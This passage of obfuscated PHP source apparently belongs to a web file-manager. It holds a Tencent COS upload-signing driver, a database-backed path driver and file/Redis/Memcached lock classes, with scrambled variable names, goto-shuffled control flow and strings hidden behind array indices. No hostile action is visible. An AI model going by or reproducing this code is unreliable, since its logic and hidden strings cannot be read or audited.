str_replace($bŞöÔË‚·Š[1094], $bŞöÔË‚·Š[33], strtolower($eàî‚æ®“†->getType())); goto CÜ¶ƒø÷ÒĞ; b°õì¾„ë: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($BƒÆó¶¡á) { parent::__construct($BƒÆó¶¡á); $this->signatureVersion($_SERVER[í…¶][200]); } public function uploadFormData($Bİíá“Ë¡‚, $CùÆåá·«î = 3600) { goto cç»ÄéÍœÉ; aƒ…†Î†ó˜: $aİÄà–¢ÜÕ = $e ›àÓíÃˆ[1098]; $A°ÇĞãáÇ‘ = gmdate($e ›àÓíÃˆ[1099], time() + $CùÆåá·«î); $cÑÖÚ¹÷³â = (string) time() . $e ›àÓíÃˆ[67] . (string) (time() + $CùÆåá·«î); goto DêÙ™´í£¢; bÃ¬äŠˆáŠ: return $AÙñõ•¹ˆŒ; goto Dˆîé¹ÓÆ; D…´¨Šô‚: $F°ø£­Üˆî = sha1($Fä„’—äš‡); $B´ ²ßôÅ = hash_hmac($e ›àÓíÃˆ[218], $F°ø£­Üˆî, $aŠëÎ’‹°Ù); $AÙñõ•¹ˆŒ = array($e ›àÓíÃˆ[1102] => $D¢ïí¢ˆó, $e ›àÓíÃˆ[1106] => $aİÄà–¢ÜÕ, $e ›àÓíÃˆ[1110] => base64_encode($Fä„’—äš‡), $e ›àÓíÃˆ[1107] => $dªìâæèğ°, $e ›àÓíÃˆ[1108] => $this->accessKey, $e ›àÓíÃˆ[1111] => $cÑÖÚ¹÷³â, $e ›àÓíÃˆ[1112] => $B´ ²ßôÅ, $e ›àÓíÃˆ[169] => $this->getHost()); goto bÃ¬äŠˆáŠ; DêÙ™´í£¢: $Fä„’—äš‡ = array($e ›àÓíÃˆ[1100] => $A°ÇĞãáÇ‘, $e ›àÓíÃˆ[1101] => array(array($e ›àÓíÃˆ[1102] => $D¢ïí¢ˆó), array($e ›àÓíÃˆ[1103] => $this->bucket), array($e ›àÓíÃˆ[1104], $e ›àÓíÃˆ[1105], $e ›àÓíÃˆ[33]), array($e ›àÓíÃˆ[1106] => $aİÄà–¢ÜÕ), array($e ›àÓíÃˆ[1107] => $dªìâæèğ°), array($e ›àÓíÃˆ[1108] => $this->accessKey), array($e ›àÓíÃˆ[1109] => $cÑÖÚ¹÷³â))); $Fä„’—äš‡ = json_encode($Fä„’—äš‡); $aŠëÎ’‹°Ù = hash_hmac($e ›àÓíÃˆ[218], $cÑÖÚ¹÷³â, $this->secret); goto D…´¨Šô‚; cç»ÄéÍœÉ: $e ›àÓíÃˆ =& $_SERVER[í…¶]; $D¢ïí¢ˆó = $e ›àÓíÃˆ[185]; $dªìâæèğ° = $e ›àÓíÃˆ[218]; goto aƒ…†Î†ó˜; Dˆîé¹ÓÆ: } public function fileOutLink($FÊáéš ïÕ) { $fŠ ­˜Š¸¾ =& $_SERVER[í…¶]; if (substr($FÊáéš ïÕ, 0, 7) == $fŠ ­˜Š¸¾[1113]) { $FÊáéš ïÕ = $fŠ ­˜Š¸¾[1114] . substr($FÊáéš ïÕ, 7); } header($fŠ ­˜Š¸¾[156] . $FÊáéš ïÕ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($bëË‰©ƒ×) { $this->pathParse = $bëË‰©ƒ×; $this->model = Model($_SERVER[í…¶][1115]); } public function getPath($d¥»ªîïì) { return trim($d¥»ªîïì, $_SERVER[í…¶][8]); } public function pathFather($BÂì›±¦¡) { $bÎå£š»³ = $this->parse($BÂì›±¦¡); $bÎå£š»³ = $this->infoSimple($BÂì›±¦¡); return $bÎå£š»³ ? $bÎå£š»³[$_SERVER[í…¶][470]] : !1; } public function getPathName($CºìÛº“Ø ) { $bš‡×ôñ‹Ğ = $this->infoSimple($CºìÛº“Ø ); return $bš‡×ôñ‹Ğ ? $bš‡×ôñ‹Ğ[$_SERVER[í…¶][28]] : !1; } public function getPathOuter($EÆ§ƒ†ÅÈÂ) { if (!$EÆ§ƒ†ÅÈÂ) { return $EÆ§ƒ†ÅÈÂ; } $D®´±”¦ÎÍ = $this->parse($EÆ§ƒ†ÅÈÂ); return KodIO::make($D®´±”¦ÎÍ[$_SERVER[í…¶][376]]); } public function copyFolderFromIO($D£˜—ˆˆ·, $d„À²Ÿ‡ãñ, $F›Å¡ÊîÎ™, $cÉÈÉöÜì, $bĞ‰ŒÊÎÎ…) { $BÍ”êÆã‰« = $this->model->copyFolderFromIO($D£˜—ˆˆ·, $d„À²Ÿ‡ãñ, $F›Å¡ÊîÎ™, $cÉÈÉöÜì, $bĞ‰ŒÊÎÎ…); return KodIO::make($BÍ”êÆã‰«); } public function isParentOf($BÄ§˜ˆó, $dõ¾«× Ì«) { return $this->model->isParentOf($BÄ§˜ˆó, $dõ¾«× Ì«); } public function mkfile($Eàö¦ì·½, $fôÀÛ©‰Ùœ = '', $f¿çÁ¤‹Ù = REPEAT_RENAME) { $A®åŒò÷äÓ =& $_SERVER[í…¶]; $AŠøßŸÎ‡Ş = $this->parse($Eàö¦ì·½); $Eàö¦ì·½ = $AŠøßŸÎ‡Ş[$A®åŒò÷äÓ[376]]; for ($bÃ¢’‰³‰ = 0; $bÃ¢’‰³‰ < count($AŠøßŸÎ‡Ş[$A®åŒò÷äÓ[1116]]); $bÃ¢’‰³‰++) { $Bˆä¡•µ‡» = $AŠøßŸÎ‡Ş[$A®åŒò÷äÓ[1116]][$bÃ¢’‰³‰]; if ($bÃ¢’‰³‰ == count($AŠøßŸÎ‡Ş[$A®åŒò÷äÓ[1116]]) - 1) { $Eàö¦ì·½ = $this->model->mkfile($Eàö¦ì·½, $Bˆä¡•µ‡», $fôÀÛ©‰Ùœ, $f¿çÁ¤‹Ù); break; } $Eàö¦ì·½ = $this->model->mkdir($Eàö¦ì·½, $Bˆä¡•µ‡», REPEAT_SKIP); } return $this->getPathOuter($Eàö¦ì·½); } public function mkdir($C’âìĞ¥©™, $A†ºá¹²§ô = REPEAT_SKIP) { $CØ·äÎÎš =& $_SERVER[í…¶]; $B×·¾ê®øä = $this->parse($C’âìĞ¥©™); $C’âìĞ¥©™ = $B×·¾ê®øä[$CØ·äÎÎš[376]]; for ($a¨Ÿ¢é·²‹ = 0; $a¨Ÿ¢é·²‹ < count($B×·¾ê®øä[$CØ·äÎÎš[1116]]); $a¨Ÿ¢é·²‹++) { $F¶äÃË± = $B×·¾ê®øä[$CØ·äÎÎš[1116]][$a¨Ÿ¢é·²‹]; $C’âìĞ¥©™ = $this->model->mkdir($C’âìĞ¥©™, $F¶äÃË±, $A†ºá¹²§ô); } return $this->getPathOuter($C’âìĞ¥©™); } public function copyFile($cİ÷­Ş¢°ò, $dË·Ïíƒ±Ñ, $aîôøÎÛ• = REPEAT_REPLACE) { $e¥ÆÂ‡àä× =& $_SERVER[í…¶]; $Cô±é¼¿‹ = $this->parse($dË·Ïíƒ±Ñ); $F½®Ûâ¬˜Ï = $this->model->copy($cİ÷­Ş¢°ò, $Cô±é¼¿‹[$e¥ÆÂ‡àä×[376]], $aîôøÎÛ•, $Cô±é¼¿‹[$e¥ÆÂ‡àä×[75]]); return $F½®Ûâ¬˜Ï ? $this->getPathOuter($F½®Ûâ¬˜Ï) : !1; } public function moveFile($b¤¦¢ŞøÇ, $e®Ç°¿¡Œ, $a‹ŞÖ„Åã = REPEAT_REPLACE) { $f”Ğô½´Œ =& $_SERVER[í…¶]; $f³ÊÔºî”ğ = $this->parse($e®Ç°¿¡Œ); $eÛçéŒœ‹ñ = $this->model->move($b¤¦¢ŞøÇ, $f³ÊÔºî”ğ[$f”Ğô½´Œ[376]], $a‹ŞÖ„Åã, $f³ÊÔºî”ğ[$f”Ğô½´Œ[75]]); return $eÛçéŒœ‹ñ ? $this->getPathOuter($eÛçéŒœ‹ñ) : !1; } public function copy($f¬ÓÆšÕŸ·, $d’’‰Ò‰„, $eàÛ³Š÷ä÷ = REPEAT_REPLACE) { $F«Úñ½ÖÌ = $this->parse($d’’‰Ò‰„); $dÔŠêß˜– = $this->model->copy($f¬ÓÆšÕŸ·, $F«Úñ½ÖÌ[$_SERVER[í…¶][376]], $eàÛ³Š÷ä÷); return $dÔŠêß˜– ? $this->getPathOuter($dÔŠêß˜–) : !1; } public function moveSameAllow() { } public function move($e¥Ï†œ¡´, $EÁ³Æ‹áâª, $A¸¦öŠ°Ãë = REPEAT_REPLACE) { $c‰Á›øì„¥ = $this->parse($EÁ³Æ‹áâª); $CôİŒ•ØÏ = $this->model->move($e¥Ï†œ¡´, $c‰Á›øì„¥[$_SERVER[í…¶][376]], $A¸¦öŠ°Ãë); return $CôİŒ•ØÏ ? $this->getPathOuter($CôİŒ•ØÏ) : !1; } public function remove($C­ÉæâÙ—, $e÷Íï½ìŒ = true) { return $this->model->remove($C­ÉæâÙ—, $e÷Íï½ìŒ); } public function rename($Cñ¥ğ™ëÔ¬, $eÍ£‘ù‰ŒË) { $B‘ÁÁÂÈ¢Ê = $this->model->rename($Cñ¥ğ™ëÔ¬, $eÍ£‘ù‰ŒË); return $B‘ÁÁÂÈ¢Ê ? $this->getPathOuter($Cñ¥ğ™ëÔ¬) : $B‘ÁÁÂÈ¢Ê; } public function size($Aõ „Ø¸²è) { $E‡ù¾Å÷¶ = $this->infoSimple($Aõ „Ø¸²è); return $E‡ù¾Å÷¶ ? $E‡ù¾Å÷¶[$_SERVER[í…¶][77]] : 0; } public function infoSimple($EâóäÔíŠÒ) { return $this->model->sourceInfo($EâóäÔíŠÒ); } public function info($bÌ†ÑŸëÀ…) { return $this->infoParse($bÌ†ÑŸëÀ…); } public function infoAuth($a­³æñµŸ¼) { return $this->infoParse($a­³æñµŸ¼, !1, !0); } public function infoWithChildren($A‚‰µ–É««) { return $this->infoParse($A‚‰µ–É««, !0); } protected function infoParse($DƒÚî£¬à, $B¥˜ŒóëÜ‰ = false, $bäÉÁ„Ø¨Ô = false) { if (!$B¥˜ŒóëÜ‰) { return $this->model->pathInfo($DƒÚî£¬à, $bäÉÁ„Ø¨Ô); } return $this->model->pathInfoMore($DƒÚî£¬à); } public function infoFull($f¶¡ùŞõ†Ã) { $dÅÁÛ©ñâ† =& $_SERVER[í…¶]; $AÒ®°¥µÑÚ = explode($dÅÁÛ©ñâ†[8], $f¶¡ùŞõ†Ã); $c¿ò‘±•£ = implode($dÅÁÛ©ñâ†[8], array_splice($AÒ®°¥µÑÚ, 1)); return $this->model->pathInfoByPath($AÒ®°¥µÑÚ[0], $c¿ò‘±•£); } public function hashSimple($c¥œ˜œö) { $DŞë‹·†Õœ =& $_SERVER[í…¶]; $f¤§êºï¶¡ = $this->infoWithChildren($c¥œ˜œö); return $f¤§êºï¶¡[$DŞë‹·†Õœ[162]][$DŞë‹·†Õœ[164]]; } public function hashMd5($fõŸÆÄ‡Öï) { $dô„ì§èÀ =& $_SERVER[í…¶]; $DÙÆËŠŠÆ­ = $this->infoWithChildren($fõŸÆÄ‡Öï); return $DÙÆËŠŠÆ­[$dô„ì§èÀ[162]][$dô„ì§èÀ[163]]; } public function exist($AÃ¹†ºÄóÚ) { $Dë²ªõùÒå =& $_SERVER[í…¶]; $e§ôå¾„Ş = $this->parse($AÃ¹†ºÄóÚ); if (!$e§ôå¾„Ş[$Dë²ªõùÒå[75]]) { return $this->isFile($AÃ¹†ºÄóÚ) || $this->isFolder($AÃ¹†ºÄóÚ); } $cµ±ï÷½±„ = array($Dë²ªõùÒå[377] => $e§ôå¾„Ş[$Dë²ªõùÒå[376]], $Dë²ªõùÒå[28] => $e§ôå¾„Ş[$Dë²ªõùÒå[75]]); $BÔÛ¿òŸÈå = $this->model->where($cµ±ï÷½±„)->find(); return $BÔÛ¿òŸÈå ? !0 : !1; } public function isFile($DĞˆ‹İß¦) { $Bõƒ¸¿¨‡´ =& $_SERVER[í…¶]; $añ®¢œ¥Ğå = $this->infoSimple($DĞˆ‹İß¦); return $añ®¢œ¥Ğå && $añ®¢œ¥Ğå[$Bõƒ¸¿¨‡´[379]] == $Bõƒ¸¿¨‡´[83] ? !1 : !0; } public function isFolder($fµŞÄÒöĞÚ) { $AŠæèÍßöÁ =& $_SERVER[í…¶]; $c«ƒœÀïèÕ = $this->infoSimple($fµŞÄÒöĞÚ); return $c«ƒœÀïèÕ && $c«ƒœÀïèÕ[$AŠæèÍßöÁ[379]] == $AŠæèÍßöÁ[83] ? !0 : !1; } public function listPath($BÆµÛ‰­¬, $dñŞÆ…È˜ = false) { $dÈ¦µ¢ç¹õ =& $_SERVER[í…¶]; if ($BÆµÛ‰­¬ == $dÈ¦µ¢ç¹õ[33]) { return !1; } $cÇƒ‹¥š›› = array($dÈ¦µ¢ç¹õ[377] => $BÆµÛ‰­¬); if ($dñŞÆ…È˜) { return $this->model->listSource($cÇƒ‹¥š››, -1); } return $this->model->listSource($cÇƒ‹¥š››); } public function has($BÌ÷îˆ˜Ş¹, $f„£µ·ïÒ = false, $B“¯°è×³‡ = null) { $DÙ²Û†­¿µ =& $_SERVER[í…¶]; $cŒ·õ©ˆƒ = $this->infoWithChildren($BÌ÷îˆ˜Ş¹); if ($f„£µ·ïÒ) { return array($DÙ²Û†­¿µ[192] => $cŒ·õ©ˆƒ[$DÙ²Û†­¿µ[192]], $DÙ²Û†­¿µ[191] => $cŒ·õ©ˆƒ[$DÙ²Û†­¿µ[191]]); } return $B“¯°è×³‡ ? $cŒ·õ©ˆƒ[$DÙ²Û†­¿µ[192]] : $cŒ·õ©ˆƒ[$DÙ²Û†­¿µ[191]]; } public function listAll($CØêÎ¤‰ß) { $b¯î§Ü¤Ô¬ = IO::info($this->pathParse[$_SERVER[í…¶][75]]); if (!$b¯î§Ü¤Ô¬) { return array(); } return $this->model->listAll($CØêÎ¤‰ß); } public function getContent($CŒ†¡„†õ) { return $this->model->getContent($CŒ†¡„†õ); } public function setContent($C¬éŠæÒÜØ, $F”‘‹œƒ³£ = '') { return $this->model->setContent($C¬éŠæÒÜØ, $F”‘‹œƒ³£); } public function fileSubstr($b¯‰Œ¿íš, $Eâ»µÎ×šÍ, $DØÊÚ—¦Î°) { return $this->model->fileSubstr($b¯‰Œ¿íš, $Eâ»µÎ×šÍ, $DØÊÚ—¦Î°); } public function download($AŸ’ŒàßõÆ, $E×ŠŸÔ’â‚ = '') { $Aå×÷µÖŒ… = get_path_father($E×ŠŸÔ’â‚); $AÑè–ÛŞùÓ = get_path_this($E×ŠŸÔ’â‚); $bñÍ’¦ùø˜ = $this->model->fileInfoGet($AŸ’ŒàßõÆ); $eµ·Õõ˜¾¶ = IO::copy($bñÍ’¦ùø˜[$_SERVER[í…¶][75]], $Aå×÷µÖŒ…, !1, $AÑè–ÛŞùÓ); return $eµ·Õõ˜¾¶; } public function setModifyTime($b¶ÈÙ®Éù•, $DÑ®—›æ = '') { $this->model->metaSet($b¶ÈÙ®Éù•, $_SERVER[í…¶][1117], $DÑ®—›æ); } public function upload($døËë©ö‹Æ, $b´Üö£³®Ï, $D¦ÜÆÎÚ÷ = false, $cÁ´áğÀœŒ = REPEAT_REPLACE) { $c½Úøõ”×À =& $_SERVER[í…¶]; $cŒ±®çíÜ = $this->parse($døËë©ö‹Æ); $FÇè»£•’ã = $this->model->addFile($cŒ±®çíÜ[$c½Úøõ”×À[376]], $b´Üö£³®Ï, $cŒ±®çíÜ[$c½Úøõ”×À[75]], $D¦ÜÆÎÚ÷, $cÁ´áğÀœŒ); return $this->getPathOuter($FÇè»£•’ã); } public function uploadFileByID($A¹Ö—¯×‘, $d¯‚éëÇÃ¨, $Cîæ²†™š¤) { $a‘ø“­– =& $_SERVER[í…¶]; $fœœ‚æåÉ— = $this->parse($A¹Ö—¯×‘); $aöïÂõ¼ = $this->model->addFileByFileID($fœœ‚æåÉ—[$a‘ø“­–[376]], $d¯‚éëÇÃ¨, $fœœ‚æåÉ—[$a‘ø“­–[75]], $Cîæ²†™š¤); return $this->getPathOuter($aöïÂõ¼); } public function addFileByRemote($c¼íŞÚÀ§, $B« ÀÖ˜Õ, $d®•Ô«¡¼¦ = array(), $eÌäÀâ§Ş‹ = '', $Cà‘­‘»•×) { $a¬ ĞœÌ•¼ =& $_SERVER[í…¶]; $DÜİçµ¤ÏÌ = $this->parse($c¼íŞÚÀ§); $eÌäÀâ§Ş‹ = empty($eÌäÀâ§Ş‹) ? $DÜİçµ¤ÏÌ[$a¬ ĞœÌ•¼[75]] : $eÌäÀâ§Ş‹; $F§ª†Ã‘ó = $this->model->addFileByRemote($DÜİçµ¤ÏÌ[$a¬ ĞœÌ•¼[376]], $B« ÀÖ˜Õ, $eÌäÀâ§Ş‹, $d®•Ô«¡¼¦, $Cà‘­‘»•×); return $this->getPathOuter($F§ª†Ã‘ó); } public function uploadLink($eª®ñÁ‘³„, $bö¡•äÌÌ = 0) { $d¶æ¶”Êå =& $_SERVER[í…¶]; $EèŞïÌÛïí = $this->parse($eª®ñÁ‘³„); $eª®ñÁ‘³„ = Model($d¶æ¶”Êå[553])->createFileName($EèŞïÌÛïí[$d¶æ¶”Êå[75]]); $c‰¬Ô „§‚ = IO::uploadLink($eª®ñÁ‘³„, $bö¡•äÌÌ); return $c‰¬Ô „§‚; } public function fileNameAuto($fÀŒš¶›‘, $f†¨®ïÊöã, $A©½ªÌ’Š = REPEAT_REPLACE, $fÑ°ãƒåÔ = false) { return $this->model->fileNameAuto($fÀŒš¶›‘, $f†¨®ïÊöã, $A©½ªÌ’Š, $fÑ°ãƒåÔ); } public function fileNameExist($a…í›²÷šƒ, $FŠ×“¹ï) { return $this->model->fileNameExist($a…í›²÷šƒ, $FŠ×“¹ï); } protected function _fileOut($d·Äè“Ä¾Ã, $cÌŠô±Ü¹È = false, $BÛÑÛ’‘ß = false, $B‡“æğ½¦ß = '', $dˆ¼×ÎØÃ = false) { goto D»ïœè®Ñæ; f§Ë„ÒË: if ($dˆ¼×ÎØÃ) { return IO::fileOutServer($DÌ÷´‚Ä†[$A¸ò½‘÷ß÷[75]], $cÌŠô±Ü¹È, $bº²Ë‘Ş, $B‡“æğ½¦ß); } IO::fileOut($DÌ÷´‚Ä†[$A¸ò½‘÷ß÷[75]], $cÌŠô±Ü¹È, $bº²Ë‘Ş, $B‡“æğ½¦ß); goto aÅ©ô™Ïëœ; cŒ‡£ÕÍˆğ: $DÌ÷´‚Ä† = $this->model->fileInfoGet($d·Äè“Ä¾Ã); $B‡“æğ½¦ß = $DÌ÷´‚Ä†[$A¸ò½‘÷ß÷[163]] ? $DÌ÷´‚Ä†[$A¸ò½‘÷ß÷[163]] : $B‡“æğ½¦ß; $bº²Ë‘Ş = isset($GLOBALS[$A¸ò½‘÷ß÷[1119]]) ? $GLOBALS[$A¸ò½‘÷ß÷[1119]] : $BôÜØÏ¼‰Š[$A¸ò½‘÷ß÷[28]]; goto f§Ë„ÒË; D»ïœè®Ñæ: $A¸ò½‘÷ß÷ =& $_SERVER[í…¶]; $BôÜØÏ¼‰Š = $this->model->sourceInfo($d·Äè“Ä¾Ã); if ($BôÜØÏ¼‰Š[$A¸ò½‘÷ß÷[379]] == $A¸ò½‘÷ß÷[83]) { header($A¸ò½‘÷ß÷[1118]); die; } goto cŒ‡£ÕÍˆğ; aÅ©ô™Ïëœ: } public function fileOut($A«—ù¿«­Â, $CŒìíõ = false, $cåªˆ³›‹Î = false, $DÄÍ§ßØèº = '') { $this->_fileOut($A«—ù¿«­Â, $CŒìíõ, $cåªˆ³›‹Î, $DÄÍ§ßØèº); } public function fileOutServer($C¥Ì–ïÄÊ¦, $a¥•ÙºøÖ = false, $E…³¯”Ñ§ = false, $AÁ©Ûö¯§ = '') { $this->_fileOut($C¥Ì–ïÄÊ¦, $a¥•ÙºøÖ, $E…³¯”Ñ§, $AÁ©Ûö¯§, !0); } protected function _fileOutImage($D¦ò›ÕÎŒ‹, $Bö¼ò¾ÚÎÍ = 250) { $bÙ›“§­´Ç =& $_SERVER[í…¶]; $fàíºëø› = $this->model->sourceInfo($D¦ò›ÕÎŒ‹); if ($fàíºëø›[$bÙ›“§­´Ç[379]] == $bÙ›“§­´Ç[83]) { show_json($bÙ›“§­´Ç[1120] . $D¦ò›ÕÎŒ‹, !1); } $GLOBALS[$bÙ›“§­´Ç[1119]] = $fàíºëø›[$bÙ›“§­´Ç[28]]; $F¦¤Ï™ê = $this->model->fileInfoGet($D¦ò›ÕÎŒ‹); IO::fileOutImage($F¦¤Ï™ê[$bÙ›“§­´Ç[75]], $Bö¼ò¾ÚÎÍ); } public function fileOutImage($Eñ¦õ²š°Â, $BÍÍ‡õà×á = 250) { $this->_fileOutImage($Eñ¦õ²š°Â, $BÍÍ‡õà×á); } public function fileOutImageServer($EÎ‘Â×åğ“, $F¼ï–Îôã† = 250) { $this->_fileOutImage($EÎ‘Â×åğ“, $F¼ï–Îôã†); } public function link($E­ŠŒ¯Ù•, $Bï¹òøŠÓ = '') { $D÷µ‚½¡ÜŒ = $this->model->fileInfoGet($E­ŠŒ¯Ù•); return IO::link($D÷µ‚½¡ÜŒ[$_SERVER[í…¶][75]], $Bï¹òøŠÓ); } protected function parse($E™•²Îá°…) { $aÈÖ§•Ú© =& $_SERVER[í…¶]; if (strstr($E™•²Îá°…, $aÈÖ§•Ú©[8]) === !1) { return array($aÈÖ§•Ú©[394] => intval($E™•²Îá°…), $aÈÖ§•Ú©[75] => $aÈÖ§•Ú©[33], $aÈÖ§•Ú©[1116] => array()); } $BÚò‚‡öç› = explode($aÈÖ§•Ú©[8], trim($E™•²Îá°…, $aÈÖ§•Ú©[8])); if (count($BÚò‚‡öç›) < 2) { show_tips($E™•²Îá°… . $aÈÖ§•Ú©[1121]); } return array($aÈÖ§•Ú©[394] => intval($BÚò‚‡öç›[0]), $aÈÖ§•Ú©[75] => $BÚò‚‡öç›[1], $aÈÖ§•Ú©[1116] => array_slice($BÚò‚‡öç›, 1)); } } goto A«Ğö÷Í‘Ÿ; cŠÚ¶Ô–ˆ„: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto fò“èŸ¹¼; fò“èŸ¹¼: $eÓİ³»×ÎÍ =& $_SERVER[í…¶]; if (self::$handle) { return self::$handle; } $c¿Øòä‰æÃ = $GLOBALS[$eÓİ³»×ÎÍ[6]][$eÓİ³»×ÎÍ[337]]; goto C‰±Î®†à; E‹ŞŒÉğŞ…: if ($D›íÃ±©÷ == $eÓİ³»×ÎÍ[17] && $F‰á¹‰Î¼ == $eÓİ³»×ÎÍ[9]) { $D›íÃ±©÷ = $eÓİ³»×ÎÍ[167]; } switch ($D›íÃ±©÷) { case $eÓİ³»×ÎÍ[760]: self::$handle = new CacheLockRedis(); break; case $eÓİ³»×ÎÍ[761]: self::$handle = new CacheLockMemcached(); break; case $eÓİ³»×ÎÍ[17]: self::$handle = new CacheLockDatabase(); break; case $eÓİ³»×ÎÍ[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto D“¹›Çİ‘; C‰±Î®†à: self::$timeout = $c¿Øòä‰æÃ[$eÓİ³»×ÎÍ[770]] ? $c¿Øòä‰æÃ[$eÓİ³»×ÎÍ[770]] : 10; $F‰á¹‰Î¼ = _get($GLOBALS[$eÓİ³»×ÎÍ[6]], $eÓİ³»×ÎÍ[771]); $D›íÃ±©÷ = $c¿Øòä‰æÃ[$eÓİ³»×ÎÍ[757]] ? $c¿Øòä‰æÃ[$eÓİ³»×ÎÍ[757]] : $eÓİ³»×ÎÍ[167]; goto E‹ŞŒÉğŞ…; D“¹›Çİ‘: } private static function key($B§›ÄÌÕÔ¶) { return $_SERVER[í…¶][772] . Cache::key($B§›ÄÌÕÔ¶); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($FÕ’İÏ« ¬ = '') { self::$errorMsg = $FÕ’İÏ« ¬; } public static function lockGlobal($fÄïÜÛ’¸, $aË®‚Ğ¦‰) { return self::lock($fÄïÜÛ’¸, $aË®‚Ğ¦‰, !0); } public static function lock($C©‰Å‚Ò‰, $d–¢¤…¸è = false, $aÃµÑƒĞ¿Â = false) { goto aôãÀØñÉ; aºŸáæšÜ: $d–¢¤…¸è = $d–¢¤…¸è ? $d–¢¤…¸è : self::$timeout; $Ağ½‘î‘„ = $Bø‚¦ÖÊŸç->lock($a§Ğ¦Êó®, $d–¢¤…¸è); if (!$Ağ½‘î‘„) { $dùÇÊ×¸âì = $eÏíÂ§†‘ê[773] . $d–¢¤…¸è . $eÏíÂ§†‘ê[67] . self::$errorMsg . $eÏíÂ§†‘ê[67] . get_caller_msg(); $Cëœ¿—ÃŞ = "\x4c\157\143\x6b\40\x61\143\164\151\x6f\156\x3a\40{$a§Ğ¦Êó®}\x20\x74\x69\x6d\x65\157\x75\x74\x2c\157\x76\145\x72\x20{$d–¢¤…¸è}\40\163"; $Cëœ¿—ÃŞ = self::$errorMsg ? self::$errorMsg : $DÌ§­º¢¢ ; write_log($dùÇÊ×¸âì, $eÏíÂ§†‘ê[774]); show_json($Cëœ¿—ÃŞ, !1); } goto c†öÊá†Û; aôãÀØñÉ: $eÏíÂ§†‘ê =& $_SERVER[í…¶]; $Bø‚¦ÖÊŸç = self::init(); $a§Ğ¦Êó® = self::key($C©‰Å‚Ò‰); goto aºŸáæšÜ; c†öÊá†Û: if (!$aÃµÑƒĞ¿Â) { self::$lockItem[$a§Ğ¦Êó®] = !0; } return $Ağ½‘î‘„; goto Aİ÷¨ê£Ç‹; Aİ÷¨ê£Ç‹: } public static function lockGet($DÜÏé›Ãğ) { $a’•½»†® = self::key($DÜÏé›Ãğ); if (self::$lockItem[$a’•½»†®]) { return self::$lockItem[$a’•½»†®]; } return self::init()->lockGet($a’•½»†®); } public static function unlock($eá³­èŒ½½) { $cø„â°¶–Ï = self::key($eá³­èŒ½½); self::$lockItem[$cø„â°¶–Ï] = null; return self::init()->unlock($cø„â°¶–Ï); } public static function unlockRuntime() { $A¸—‰ì™Ö¼ =& $_SERVER[í…¶]; $b Ï¾¶‚ = self::init(); $FÊìİËÄ‰ = !1; foreach (self::$lockItem as $cò×É¶¸¼ => $b‹‘ˆøŒ¯Ş) { if (!$b‹‘ˆøŒ¯Ş) { continue; } $b Ï¾¶‚->unlock($cò×É¶¸¼); if (!$FÊìİËÄ‰) { $FÊìİËÄ‰ = !0; write_log($A¸—‰ì™Ö¼[775] . $cò×É¶¸¼ . $A¸—‰ì™Ö¼[67] . get_caller_msg(), $A¸—‰ì™Ö¼[774]); continue; } write_log($A¸—‰ì™Ö¼[775] . $cò×É¶¸¼, $A¸—‰ì™Ö¼[774]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $CÙËŒ‰µ¼Ö =& $_SERVER[í…¶]; $C¸Â¶ÚØãì = $GLOBALS[$CÙËŒ‰µ¼Ö[6]][$CÙËŒ‰µ¼Ö[337]]; self::$cachePath = $C¸Â¶ÚØãì[$CÙËŒ‰µ¼Ö[167]][$CÙËŒ‰µ¼Ö[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($eßö×––¯, $EÂŠÁºä = 0) { goto e°´†î”¯; e°´†î”¯: $a‚ù¥¯í˜÷ =& $_SERVER[í…¶]; $a›°˜‹Ô¨ = microtime(!0); $fíÉŒ‘¸¼¿ = $a›°˜‹Ô¨ + $EÂŠÁºä + 0.0001; goto B¢ñŠîøµ; B¢ñŠîøµ: $C“ËÆ×¨± = rtrim(self::$cachePath, $a‚ù¥¯í˜÷[8]) . $a‚ù¥¯í˜÷[776] . md5($eßö×––¯) . $a‚ù¥¯í˜÷[777]; if (file_exists($C“ËÆ×¨±) && filemtime($C“ËÆ×¨±) && filemtime($C“ËÆ×¨±) < time() - 10) { @unlink($C“ËÆ×¨±); } do { if (file_exists($C“ËÆ×¨±)) { cacheLockWait(); continue; } $eÄí×«õ‡¿ = fopen($C“ËÆ×¨±, $a‚ù¥¯í˜÷[778]); if (!$eÄí×«õ‡¿) { return !1; } $E“ˆ£ºÇ·Ø = flock($eÄí×«õ‡¿, LOCK_EX | LOCK_NB); self::$caches[$eßö×––¯] = array($a‚ù¥¯í˜÷[779] => $eÄí×«õ‡¿, $a‚ù¥¯í˜÷[167] => $C“ËÆ×¨±); fwrite($eÄí×«õ‡¿, $fíÉŒ‘¸¼¿); clearstatcache(); if ($eÄí×«õ‡¿ && $E“ˆ£ºÇ·Ø) { return !0; } cacheLockWait(); } while (microtime(!0) < $fíÉŒ‘¸¼¿); goto AñëÏİù¶; AñëÏİù¶: $this->unlock($eßö×––¯); return !1; goto c¤Õ†±Á•; c¤Õ†±Á•: } public function lockGet($A´ÔçÜåÚÁ) { $C‰Èš¨ÉÇõ =& $_SERVER[í…¶]; $a¹œéö‚ É = rtrim(self::$cachePath, $C‰Èš¨ÉÇõ[8]) . $C‰Èš¨ÉÇõ[776] . md5($A´ÔçÜåÚÁ) . $C‰Èš¨ÉÇõ[777]; return file_exists($a¹œéö‚ É); } public function unlock($a‚ë’‰÷÷) { goto d£ˆĞ«ñ°; CšèÄãÔ­: @flock($A ·é«òË[$b²ŒèĞº©’[779]], LOCK_UN); @fclose($A ·é«òË[$b²ŒèĞº©’[779]]); @unlink($A ·é«òË[$b²ŒèĞº©’[167]]); goto b®“êÚºßé; b®“êÚºßé: unset(self::$caches[$a‚ë’‰÷÷]); goto BÚ­µÀ™õÁ; d£ˆĞ«ñ°: $b²ŒèĞº©’ =& $_SERVER[í…¶]; $A ·é«òË = self::$caches[$a‚ë’‰÷÷]; if (!$A ·é«òË) { return; } goto CšèÄãÔ­; BÚ­µÀ™õÁ: } } goto d²¦–Å¸¡; EÛğŠ§‡‘Ã: class DbManage { function __construct($e“æŒ«›, $C‚°²„–Â = '') { $this->database = $e“æŒ«›; $this->type = $C‚°²„–Â; } public function model($DË¶šõÂ’ = '') { return new 